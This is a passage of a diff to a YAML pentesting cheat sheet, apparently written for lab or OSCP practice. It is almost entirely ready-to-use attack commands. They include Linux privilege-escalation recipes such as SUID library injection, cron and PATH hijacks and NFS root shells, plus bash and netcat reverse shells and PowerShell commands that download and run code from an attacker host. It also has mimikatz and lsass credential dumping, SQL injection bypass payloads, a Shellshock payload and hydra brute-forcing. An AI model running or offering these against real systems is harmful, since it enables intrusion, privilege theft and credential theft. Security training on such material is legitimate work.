-      \ >>/usr/local/bin/overwrite.sh\n    $ /tmp/bash -p => can use /bin/sh as well\n\
-      \    # id\n    path:\n    useful when a cronjob doesn't use absolute path for\
-      \ a program and one of the path directories is writable\n    $ cat /etc/crontab\
-      \ => $PATH has /home/user as the first search location and overwrite.sh is called\
-      \ without it's absolute path\n    $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'\
-      \ >>/home/user/overwrite.sh\n    $ /tmp/bash -p => can use /bin/sh as well\n\
-      \    # id\n    wildcards:\n    $ cat /etc/crontab => compress.sh is run as root\
-      \ and is world readable\n    $ cat /usr/local/bin/compress.sh => tar command\
-      \ uses a shell wildcard within /home/user directory\n    $\n    $ echo 'cp /bin/bash\
-      \ /tmp/bash; chmod +s /tmp/bash' >/home/user/runme.sh\n    $ touch /home/user/--checkpoint=1\n\
-      \    $ touch /home/user/--checkpoint-action=exec=sh\\ runme.sh\n    $ /home/user/bash\
-      \ -p\n    # id\n    OR\n    $ msfvenom-p linux/x64/shell_reverse_tcpLHOST=<IP>\
-      \ LPORT=53 -f elf -o shell.elf\n    $ touch /home/user/--checkpoint=1\n    $\
-      \ touch /home/user/--checkpoint-action=exec=shell.elf\n    # nc -nlvp 53\n \
-      \ suid/sgid binaries:\n    find suid/sgid binaries:\n    $ find / -type f -a\
-      \ \\( -perm -u+s-o -perm -g+s\\) -exec ls -l {} \\; 2> /dev/null\n    shell\
-      \ escape sequences:\n    https://gtfobins.github.io/\n    sudo -l:\n      awk:\
-      \ sudo awk 'BEGIN {system(\"/bin\")}'\n      find: sudo find /bin -name nano\
-      \ -exec /bin/sh \\;\n      vim: sudo vim -c '!sh'\n      nmap:\n        non-interactive:\
-      \ echo \"os.execute('/bin/sh')\" >shell.nse && sudo nmap --script=shell.nse\n\
-      \        interactive:\n        nmap --interactive\n          > !sh\n    LD_PRELOAD/LD_LIBRARY_PATH:\n\
-      \    both these environment variables are ignored for suid/sgid files by default\
-      \ in linux for security reasons\n    known exploits:\n    certain programs create\
-      \ suid files that can be exploited\n    exim:\n      $ find / -type f -a \\\
-      ( -perm -u+s-o -perm -g+s\\) -exec ls -l {} \\; 2> /dev/null\n        ...\n\
-      \        -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3\n\
-      \        ...\n      $ /usr/sbin/exim-4.84-3 --version\n        Exim version\
-      \ 4.84 #3 built 13-May-2017 01:45:35\n      # searchsploit exim 4.84\n     \
-      \   ...\n        Exim 4.84-3 - Local Privilege Escalation | exploits/linux/local/39535.sh\n\
-      \      $ ./privesc.sh\n        [ CVE-2016-1531 local root exploit\n      # id\n\
-      \        uid=0(root) gid=1000(user) groups=0(root)\n    shared object injection:\n\
-      \    $ find / -type f -perm -04000 -ls 2>/dev/null => note all suid binaries\n\
-      \    $ strace /usr/local/bin/suid-so 2>&1 | grep -i -E \"open|access|no such\
-      \ file\" => one of the suid binaries is missing a shared object in a writable\
-      \ location\n      #include <stdio.h>\n      #include <stdlib.h>\n      static\
-      \ void inject() __attribute((constructor));\n      void inject(){system(\"cp\
-      \ /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\");}\n    $ gcc\
-      \ -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c\
-      \ => create a custom shared object for missing file\n    $ /usr/local/bin/suid-so\
-      \ => run suid binary to get root shell\n    # id\n    path environment variable:\n\
-      \    look for vulnerable programs:\n      $ strings /path/to/file\n      $ strace\
-      \ -v -f -e execve <command> 2>&1 | grep exec\n      $ ltrace <command>\n   \
-      \ search for suid binaries:\n      $ find / -type f -perm -04000 -ls 2>/dev/null\n\
-      \    look for strings within a suid binary, this one calls \"service apache2\
-      \ start\", service doesn't have absolute path:\n      $ strings /usr/local/bin/suid-env\n\
-      \    create a dummy service binary to gain root shell:\n      $ echo 'int main(){setgid(0);setuid(0);system(\"\
-      /bin/bash -p\");return 0;}'>/tmp/service.c\n    compile dummy service binary\
-      \ and place in /tmp directory:\n      $ gcc /tmp/service.c -o /tmp/service\n\
-      \    update path to load service from /tmp first:\n      $ export PATH=/tmp:$PATH\n\
-      \    run suid binary to gain root shell:\n      $ /usr/local/bin/suid-env\n\
-      \      # id\n    abusing shell features #1:\n    some shells (notably Bash <4.2-048)\
-      \ it is possible to define user functions with an absolute path name\n    these\
-      \ functions can be exported so that subprocesses have access to them, and the\
-      \ functions can take precedence over the actual executable being called\n  \
-      \  search for suid binaries:\n      $ find / -type f -perm -04000 -ls 2>/dev/null\n\
-      \    look for strings within a suid binary, this one calls \"/usr/sbin/service\
-      \ apache2 start\":\n      $ strings /usr/local/bin/suid-env2\n    create a shell\
-      \ function with name equal to absolute path of service binary:\n      $ function\
-      \ /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash\
-      \ -p; }\n    export function:\n      $ export -f /usr/sbin/service\n    run\
-      \ suid binary to gain root shell:\n      $ /usr/local/bin/suid-env2\n      #\
-      \ id\n    abusing shell features #2:\n    the Bash shell has a debugging mode\
-      \ which can be enabled with the -x command line option, or by modifying the\
-      \ SHELLOPTS environment variable to include xtrace\n    by default, SHELLOPTS\
-      \ is read only, however the env command allows SHELLOPTS to be set\n    when\
-      \ in debugging mode, Bash uses the environment variable PS4 to display an extra\
-      \ prompt for debug statements\n    this variable can include an embedded command,\
-      \ which will execute every time it is shown\n    if an SUID file runs another\
-      \ program via Bash (e.g. by using system()) these environment variables can\
-      \ be inherited\n    if an SUID file is being executed, this command will execute\
-      \ with the privileges of the file owner\n    in Bash versions 4.4 and above,\
-      \ the PS4 environment variable is not inherited by shells running as root\n\
-      \    $ env -i SHELLOPTS=xtrace PS4='$(/cp /bin/bash /tmp && chown root:root\
-      \ /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set\
-      \ +x; /tmp/bash -p'\n    # id\n    symlink:\n    https://www.exploit-db.com/exploits/40768\n\
-      \    $ dpkg -l | grep nginx => nginx version is <1.6.2-5+deb8u3\n    $ su -l\
-      \ www-data => need to www-data for exploit to work\n    $ /home/user/tools/nginx/nginxed-root.sh\
-      \ /var/log/nginx/error.log => exploit script\n      wait for logs to rotate,\
-      \ to speed up the process:\n        ssh user@192.168.92.162\n        su\n  \
-      \      invoke-rc.d nginx rotate >/dev/null 2>&1\n    # id\n  password and keys:\n\
-      \    password reuse can be an easy way to priv esc (service files leaking password\
-      \ that is reused for system root account)\n    history files:\n    $ cat $HOME/.*history\
-      \ | less\n      ls -al\n      cat .bash_history\n      ls -al\n      mysql-h\
-      \ somehost.local -uroot -ppassword123\n    $ su\n    # id\n    config files:\n\
-      \    $ ls\n      myvpn.ovpn tools\n    $ cat myvpn.ovpn\n      ...\n      auth-user-pass\
-      \ /etc/openvpn/auth.txt\n      ...\n    $ cat /etc/openvpn/auth.txt\n      root\n\
-      \      password123\n    $ su\n    # id\n    ssh keys:\n    copy .ssh/id_rsa\
-      \ to local system\n    $ grep PermitRootLogin /etc/ssh/sshd_config\n    # chmod\
-      \ 600 id_rsa\n    # ssh -i id_rsa root@<targetip>\n  nfs:\n    check available\
-      \ mountpoints:\n    # nmap -sV -script=nfs-showmount <targetip>\n    OR\n  \
-      \  $ cat /etc/exports => / *(rw,no_root_squash)\n    $ cat /etc/exports => /tmp\
-      \ *(rw,sync,insecure,no_root_squash,no_subtree_check)\n    steps:\n    # showmount\
-      \ -e 192.168.92.162\n    # mkdir /tmp/lpe\n    # mount -o rw,vers=2 192.168.92.162:/tmp\
-      \ /tmp/lpe/\n    # echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"\
-      ); return 0;}' >/tmp/lpe/shell.c\n    # gcc -o /tmp/lpe/shell /tmp/lpe/shell.c\
-      \ \n    # chmod +s /tmp/lpe/shell\n    # ls -l /tmp/lpe/\n    $ /tmp/shell\n\
-      \    # id\n    root squashing:\n    allows nfs to squash root user privs to\
-      \ avoid privesc\n    can be disabled using the no_root_squash option within\
-      \ config\n  misc:\n    chkrootkit:\n    create a file /tmp/update with commands\
-      \ for lpe\n    make /tmp/update executable\n    wait for chkrootkit to execute\
-      \ as part of cronjob\n    ssh knownhosts:\n    sometimes there could be a 127.0.0.1\
-      \ entry within a non-root user's known_hosts file\n    if the ssh config allows\
-      \ root login and non-root user's public key is added to root's authorized_keys\n\
-      \    we can ssh as root: ssh -i id_rsa root@127.0.0.1\nwindows:\n  systeminfo\n\
-      \  whoami /priv:\n    if SeImpersonatePrivilege are enabled, use juicypotato\
-      \ (https://github.com/ohpe/juicy-potato/releases). this will also need a reverse\
-      \ shell that can be created using msfvenom\n  enumerate:\n    wpc.exe\n    https://github.com/GDSSecurity/Windows-Exploit-Suggester\n\
-      \    windows_privesc_check.py\n    windows-privesc-check2.exe\n    systeminfo\
-      \ | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n    check file permissions\
-      \ (useful if writable by everyone): icacls filename\n    running services: wmic\
-      \ service where started=true get name, startname\n    stored credentials:\n\
-      \    dir C:\\unattend.xml\n    post/windows/gather/enum_unattend\n    post/windows/gather/credentials/gpp\n\
-      \    reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\n    reg query \"\
-      HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\n    reg query\
-      \ \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n  enumerate:\n    powershell\
-      \ -c \"(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/mimikatz64.exe','c:\\\
-      temp\\mimikatz64.exe')\"\n    powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/nc64.exe','c:\\\
-      temp\\nc64.exe')\"\n    powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/priv-check.exe','c:\\\
-      temp\\priv-check.exe')\"\n    powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/jaws-enum.ps1','c:\\\
-      temp\\jaws-enum.ps1')\"\n    powershell -ExecutionPolicy Bypass -noLogo -Command\
-      \ \"IEX(New-Object Net.WebClient).downloadString('http://192.168.29.31:8000/powerup.ps1');\
-      \ Invoke-AllChecks\"\n    powershell -ExecutionPolicy Bypass -noLogo -Command\
-      \ \"IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1');\
-      \ Find-AllVulns\"\n  services:\n    dll hijacking\n    unquoted paths\n    named\
-      \ pipes\n    registry\n    executable file\n    binPath\n    SERVICE_ALL_ACCESS:\n\
-      \    accesschk.exe -cuwv \"user\" *\n      look for services with SERVICE_ALL_ACCESS\
-      \ flag set\n    sc qc <servicename>\n      get more details about the service\n\
-      \      make sure service has no dependencies\n      change start type to ondemand\n\
-      \      use netcat to get a reverse shell connection\n      sc config <servicename>\
-      \ start= \"demand\"\n      sc config <servicename> binpath= \"C:\\Users\\User\\\
-      Desktop\\nc.exe -n <targetip> <attackerport> -e C:\\WINDOWS\\System32\\cmd.exe\"\
-      \n      sc config <servicename> obj= \".\\LocalSystem\" password= \"\"\n   \
-      \   net start <servicename>\n  password mining:\n    registry:\n    logs\n \
-      \   .rdp files\n    memory:\n    configuration files:\n    cached SAM\n  registry:\n\
-      \    autorun\n    AlwaysInstallElevated\n  scheduled tasks:\n    binary overwrite\n\
-      \    missing binary\n"
-    description: privesc
-  - cli: 'rbash:
-
-      bash -i
-
-      BASH_CMDS[poop]=/bin/bash;poop
-
-      lshell:
-
-      echo os.system("/bin/bash")
-
-      '
+  - cli: "rbash:\n  bash -i\n  BASH_CMDS[foobar]=/bin/bash;foobar\nlshell:\n  echo\
+      \ os.system(\"/bin/bash\")\n"
     description: restricted shells
-  - cli: ''
-    description: reverse shell generator
+  - cli: "reverse tcp shell from bash:\n  /bin/bash -i >& /dev/tcp/<targetip>/<attackerport>\
+      \ 0>&1\nmake a partially interactive terminal usable:\n  target: python -c \"\
+      import pty; pty.spawn('/bin/bash')\"\nlocal:\n  stty raw -echo ; fg\ntarget:\n\
+      \  reset ; export SHELL=bash ; export TERM=xterm ; stty size ; stty -rows 45\
+      \ -columns 90 ; stty size\nreverse php shell on windows:\n  https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php\n"
+    description: reverse shell
     references:
     - https://shellgenerator.github.io/
     - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-  - cli: 'http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-
-      reverse tcp shell from bash:
-
-      /bin/bash -i >& /dev/tcp/<targetip>/<attackerport> 0>&1
-
-      make a partially interactive terminal usable:
-
-      target: python -c "import pty; pty.spawn(''/bin/bash'')"
-
-      local: stty raw -echo ; fg
-
-      target: reset ; export SHELL=bash ; export TERM=xterm ; stty size ; stty -rows
-      45 -columns 90 ; stty size
-
-      reverse php shell on windows:
-
-      https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
-
-      '
-    description: shell
+    - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
   - cli: '/bin/sh: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
 
       '
@@ -7406,46 +7117,56 @@ summary:
       test http header, user-agent probably
 
       curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c ''cat /etc/passwd''"
-      http://shocker.htb/cgi-bin/user.sh
+      http://<targetip>/cgi-bin/user.sh
 
-      gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+      gobuster -u <targetip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
       -s 200,204,301,302,307,403
 
-      gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+      gobuster -u <targetip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
       -s 200,204,301,302,307,403 -k -x sh,pl,py
 
-      nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls
-      10.10.10.56
+      nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls
+      <targetip>
 
       '
     description: shellshock
-  - cli: 'manual verification:
+  - cli: "manual verification:\n  ' or 1=1 -- -\n  ' || 1=1 #\n  or 1=1\n  or 1=1--\n\
+      \  or 1=1#\n  or 1=1/*\n  admin' --\n  admin' #\n  admin'/*\n  admin' or '1'='1\n\
+      \  admin' or '1'='1'--\n  admin' or '1'='1'#\n  admin' or '1'='1'/*\n  admin'or\
+      \ 1=1 or ''='\n  admin' or 1=1\n  admin' or 1=1--\n  admin' or 1=1#\n  admin'\
+      \ or 1=1/*\n  admin') or ('1'='1\n  admin') or ('1'='1'--\n  admin') or ('1'='1'#\n\
+      \  admin') or ('1'='1'/*\n  admin') or '1'='1\n  admin') or '1'='1'--\n  admin')\
+      \ or '1'='1'#\n  admin') or '1'='1'/*\n  1234 ' AND 1=0 UNION ALL SELECT 'admin',\
+      \ '81dc9bdb52d04dc20036dbd8313ed055\n  admin\" --\n  admin\" #\n  admin\"/*\n\
+      \  admin\" or \"1\"=\"1\n  admin\" or \"1\"=\"1\"--\n  admin\" or \"1\"=\"1\"\
+      #\n  admin\" or \"1\"=\"1\"/*\n  admin\"or 1=1 or \"\"=\"\n  admin\" or 1=1\n\
+      \  admin\" or 1=1--\n  admin\" or 1=1#\n  admin\" or 1=1/*\n  admin\") or (\"\
+      1\"=\"1\n  admin\") or (\"1\"=\"1\"--\n  admin\") or (\"1\"=\"1\"#\n  admin\"\
+      ) or (\"1\"=\"1\"/*\n  admin\") or \"1\"=\"1\n  admin\") or \"1\"=\"1\"--\n\
+      \  admin\") or \"1\"=\"1\"#\n  admin\") or \"1\"=\"1\"/*\n  1234 \" AND 1=0\
+      \ UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\nfind a row\
+      \ where you can place your output:\n  http://<targetip>/inj.php?id=1 union all\
+      \ select 1,2,3,4,5,6,7,8\nget db version:\n  http://<targetip>/inj.php?id=1\
+      \ union all select 1,2,3,@@version,5\nget current user:\n  http://<targetip>/inj.php?id=1\
+      \ union all select 1,2,3,user(),5\nsee all tables:\n  http://<targetip>/inj.php?id=1\
+      \ union all select 1,2,3,table_name,5 from information_schema.tables\nget column\
+      \ names for a specified table:\n  http://<targetip>/inj.php?id=1 union all select\
+      \ 1,2,3,column_name,5 from information_schema.columns where table_name='users'\n\
+      concat user names and passwords:\n  http://<targetip>/inj.php?id=1 union all\
+      \ select 1,2,3,concat(name, 0x3a , password),5 from users\nwrite to a file:\n\
+      \  http://<targetip>/inj.php?id=1 union all select 1,2,3,\"content\",5 into\
+      \ outfile 'outfile'\n"
+    description: sql injection
+    references:
+    - https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+  - cli: 'chmod +x /foo/bar
 
-      '' or 1=1 -- -
-
-      '' || 1=1 #
-
-      find a row where you can place your output: http://<targetip>/inj.php?id=1 union
-      all select 1,2,3,4,5,6,7,8
-
-      get db version: http://<targetip>/inj.php?id=1 union all select 1,2,3,@@version,5
-
-      get current user: http://<targetip>/inj.php?id=1 union all select 1,2,3,user(),5
-
-      see all tables: http://<targetip>/inj.php?id=1 union all select 1,2,3,table_name,5
-      from information_schema.tables
-
-      get column names for a specified table: http://<targetip>/inj.php?id=1 union
-      all select 1,2,3,column_name,5 from information_schema.columns where table_name=''users''
-
-      concat user names and passwords: http://<targetip>/inj.php?id=1 union all select
-      1,2,3,concat(name, 0x3a , password),5 from users
-
-      write to a file: http://<targetip>/inj.php?id=1 union all select 1,2,3,"content",5
-      into outfile ''outfile''
+      update-rc.d /foo/bar defaults
 
       '
-    description: sqli
+    description: startup scripts
+    references:
+    - https://gist.github.com/AvasDream/47f13a510e543009a50c8241276afc24
   - cli: 'strings
 
       exiftool
@@ -7454,18 +7175,58 @@ summary:
 
       '
     description: stegnography
-  - cli: "connect via squid proxy @ 3128/tcp on 192.168.1.24, redirect to ssh service\
-      \ on localhost, run a local standalone daemon on 1234/tcp\nproxytunnel -p <targetip>:3128\
-      \ -d 127.0.0.1:22 -a 1234\nssh john@127.0.0.1 /bin/bash\nvim /etc/proxychains.conf\n\
-      \  http <targetip> 3128\nproxychains nmap -sT -p22 <targetip>\nproxychains ssh\
-      \ john@<targetip> /bin/bash\n"
-    description: tunneling
-  tools:
-  - cli: 'set an upstream proxy within burp
+  - cli: 'prefix: ctrl + b
 
-      burp > user options > upstream proxy > 192.168.92.146:3128
+      toggle logging: prefix + shift + p
+
+      screen cap: prefix + alt + p
+
+      complete history: prefix + alt + shift + p
 
       '
+    description: tmux shortcuts
+  - cli: "connect via squid proxy @ 3128/tcp on <targetip>, redirect to ssh service\
+      \ on localhost, run a local standalone daemon on <targetport>:\n  proxytunnel\
+      \ -p <targetip>:<targetport> -d 127.0.0.1:22 -a 1234\n  ssh john@127.0.0.1 /bin/bash\n\
+      \  vim /etc/proxychains.conf\n    http <targetip> <targetport>\n  proxychains\
+      \ nmap -sT -p22 <targetip>\n  proxychains ssh <username>@<targetip> /bin/bash\n\
+      forward remote port to local address:\n  plink.exe -P 22 -l root -pw \"<password>\"\
+      \ -R 445:127.0.0.1:445 <targetip>\n"
+    description: tunneling
+  - cli: 'net localgroup Users
+
+      net localgroup Administrators
+
+      search dir/s *.doc
+
+      system("start cmd.exe /k $cmd")
+
+      sc create microsoft_update binpath="cmd /K start c:\nc.exe -d <targetip> <targetport>
+      -e cmd.exe" start= auto error= ignore /c C:\nc.exe -e c:\windows\system32\cmd.exe
+      -vv <targetip> <targetport>
+
+      mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords full"
+
+      procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+      mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+
+      C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp ## for 32 bits
+
+      C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp ## for 64 bits
+
+      bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerip>/payload.exe
+      C:\\Users\\%USERNAME%\\AppData\\local\\temp\\payload.exe
+
+      powershell history: type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+      '
+    description: windows useful commands
+    references:
+    - https://0xdarkvortex.dev/index.php/2018/04/17/31-days-of-oscp-experience/
+  tools:
+  - cli: "set an upstream proxy within burp:\n  burp > user options > upstream proxy\
+      \ > <targetip>:<targetport>\n"
     description: burp
   - cli: 'cewl www.megacorpone.com -m 6 -w /root/newfilelist.txt 2>/dev/null
 
@@ -7473,7 +7234,7 @@ summary:
     description: cewl
   - cli: 'fcrackzip -uDp /usr/share/wordlists/rockyou.txt <file.zip>
 
-      unzip -o -P "password" ,file.zip>
+      unzip -o -P "password" <file.zip>
 
       '
     description: fcrackzip
@@ -7486,120 +7247,75 @@ summary:
       \ -u http://<targetip> -w /usr/share/seclists/Discovery/Web-Content/big.txt\
       \ -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'\n\
       ippsec:\n  gobuster -u http://<targetip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
-      \ -s 200,204,301,302,307,403 -k -x txt,php,asp\n  gobuster -u 10.10.10.56 -w\
-      \ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403\
+      \ -s 200,204,301,302,307,403 -k -x txt,php,asp\n  gobuster -u http://<targetip>\
+      \ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403\
       \ -k -x sh,pl\ncgi list:\n  /usr/share/seclists/Discovery/Web-Content/CGIs.txt\n"
     description: gobuster
-  - cli: 'hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt
+  - cli: 'hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt
 
       '
     description: hashcat
-  - cli: 'generic:
-
-      hydra -ufl /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt
-      <targetip>
-
-      ftp:
-
-      hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt
-      192.168.13.236 ftp
-
-      http:
-
-      hydra -l admin -P /root/ctf_wordlist.txt kioptrix3.com http-post-form "/admin.php:u=^USER^&p=^PASS^&f=login:''Enter
-      your username and password to continue''" -V
-
-      with cookie: hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.92.110
-      -V http-get ''/dir/page.php?name=^USER^&pass=^PASS^&submit=Log In:F=Incorrect:H=Cookie:
-      insert stuff here''
-
-      pop3:
-
-      hydra -l root -P /usr/share/wordlists/rockyou.txt <targetip> pop3
-
-      rdp:
-
-      hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt rdp://<targetip>
-
-      smtp:
-
-      hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t
-      1 -w 20 -f <targetip> smtp
-
-      ssh:
-
-      hydra -l root -P /usr/share/wordlists/rockyou.txt <targetip> ssh
-
-      hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt
-      <targetip> ssh
-
-      hydra -t 4 -L /usr/share/wordlists/rockyou.txt -p some_passsword <targetip>
-      ssh
-
-      wordpress:
-
-      hydra -l elliot -P ./fsocity.dic <targetip> http-post-form "/wp-login.php:log=elliot&pwd=^PASS^:ERROR"
-
-      '
+  - cli: "generic:\n  hydra -ufl /usr/share/wordlists/metasploit/unix_users.txt -P\
+      \ /usr/share/wordlists/metasploit/unix_passwords.txt <targetip>\nftp:\n  hydra\
+      \ -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt\
+      \ <targetip> ftp\nhttp:\n  hydra -l admin -P /root/ctf_wordlist.txt kioptrix3.com\
+      \ http-post-form \"/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username\
+      \ and password to continue'\" -V\nwith cookie:\n  hydra -l user -P /usr/share/wordlists/rockyou.txt\
+      \ <targetip> -V http-get '/dir/page.php?name=^USER^&pass=^PASS^&submit=Log In:F=Incorrect:H=Cookie:\
+      \ insert stuff here'\npop3:\n  hydra -l root -P /usr/share/wordlists/rockyou.txt\
+      \ <targetip> pop3\nrdp:\n  hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt\
+      \ rdp://<targetip>\nsmtp:\n  hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt\
+      \ -t 1 -w 20 -f <targetip> smtp\nssh:\n  hydra -l root -P /usr/share/wordlists/rockyou.txt\
+      \ <targetip> ssh\n  hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt\
+      \ <targetip> ssh\n  hydra -t 4 -L /usr/share/wordlists/rockyou.txt -p some_passsword\
+      \ <targetip> ssh\nwordpress:\n  hydra -l elliot -P ./fsocity.dic <targetip>\
+      \ http-post-form \"/wp-login.php:log=elliot&pwd=^PASS^:ERROR\"\n"
     description: hydra
-  - cli: 'create custom wordlist:
-
-      john --wordlist=megacorpone-cewl --rules --stdout >megacorpone-cewl-jtr
-
-      crack shadow hashes:
-
-      unshadow passwd shadow >unshadowed ; john --rules --wordlist=/usr/share/wordlists/rockyou.txt
-      unshadowed ; john --show unshadowed
-
-      crack md5 hashes:
-
-      john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hashes
-
-      '
+  - cli: "create custom wordlist:\n  john --wordlist=megacorpone-cewl --rules --stdout\
+      \ >megacorpone-cewl-jtr\ncrack shadow hashes:\n  unshadow passwd shadow >unshadowed\
+      \ ; john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed ; john\
+      \ --show unshadowed\ncrack md5 hashes:\n  john --wordlist=/usr/share/wordlists/rockyou.txt\
+      \ --format=RAW-MD5 hashes\n"
     description: john
-  - cli: 'rootkit:
-
-      https://github.com/PinkP4nther/Pinkit
-
-      '
+  - cli: "rootkit:\n  https://github.com/PinkP4nther/Pinkit\n"
     description: kernel module
   - cli: 'openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out
       server.crt -subj "/CN=root.kali.pwn" --days 7
 
-      GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.10.14.19:<attackerport>"
+      GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://<targetip>:<attackerport>"
       -o merlinagentx64.exe main.go
 
       go build -o merlinagent.elf main.go
 
       '
     description: merlin c2 framework
-  - cli: 'systemctl start postgresql
+  - cli: 'db_status
 
-      systemctl status postgresql
+      load mimiktaz
+
+      msfconsole -q
 
       msfdb init
 
       msfdb start
 
-      msfconsole -q
+      search <string>
+
+      set payload windows/x86/meterpreter/reverse_tcp
 
       set verbose true
 
-      db_status
-
-      search <string>
+      show advanced
 
       show options
-
-      show advanced
 
       show payloads
 
       show targets
 
-      windows/x86/meterpreter/reverse_tcp
+      systemctl start postgresql
 
-      load mimiktaz
+      systemctl status postgresql
 
       wdigest
 
@@ -7623,19 +7339,8 @@ summary:
       \  msfvenom -p linux/x86/shell_reverse_tcp -f elf-so lhost=<targetip> lport=<attackerport>\
       \ -o linux-shell-reverse-tcp.so\n"
     description: msfvenom
-  - cli: 'bind:
-
-      nc -lvp <attackerport>
-
-      connect:
-
-      nc -nv <targetip> <attackerport>
-
-      reverse:
-
-      nc -e /bin/bash <targetip> <attackerport>
-
-      '
+  - cli: "bind:\n  nc -lvp <attackerport>\nconnect:\n  nc -nv <targetip> <attackerport>\n\
+      reverse:\n  nc -e /bin/bash <targetip> <attackerport>\n"
     description: netcat
   - cli: "bruteforce rdp login:\n  ncrack -vv --user administrator -P passwords.txt\
       \ rdp://<targetip>\n"
@@ -7646,7 +7351,9 @@ summary:
     description: netdiscover
   - cli: 'nikto -h http://<targetip>
 
-      nikto -h 192.168.92.146 -useproxy http://192.168.92.146:3128
+      nikto -C all -h http://IP
+
+      nikto -h <targetip> -useproxy http://<targetip>:3128
 
       '
     description: nikto
@@ -7689,77 +7396,39 @@ summary:
 
       '
     description: socat
-  - cli: 'avoid prompts, use defaults:
-
-      sqlmap --batch
-
-      read http request from a text file (request captured from burp, useful for POST
-      requests) and use it to start scan:
-
-      sqlmap -r searchform.txt --dbs --batch
-
-      sqlmap -r searchform.txt -D webapphacking --dump-all --batch
-
-      post requests:
-
-      sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
-
-      intrusive scans:
-
-      sqlmap --level 5 --risk 3
-
-      list databses:
-
-      sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos"
-      --dbs
-
-      list tables within a database:
-
-      sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos"
-      -D gallery --tables
-
-      dump a table:
-
-      sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos"
-      -D gallery -T dev_accounts --dump
-
-      blind sql enumeration:
-
-      sqlmap -u "http://192.168.92.151:1337/978345210/index.php" --forms --dbs
-
-      '
+  - cli: "avoid prompts, use defaults:\n  sqlmap --batch\nread http request from a\
+      \ text file (request captured from burp, useful for POST requests) and use it\
+      \ to start scan:\n  sqlmap -r searchform.txt --dbs --batch\n  sqlmap -r searchform.txt\
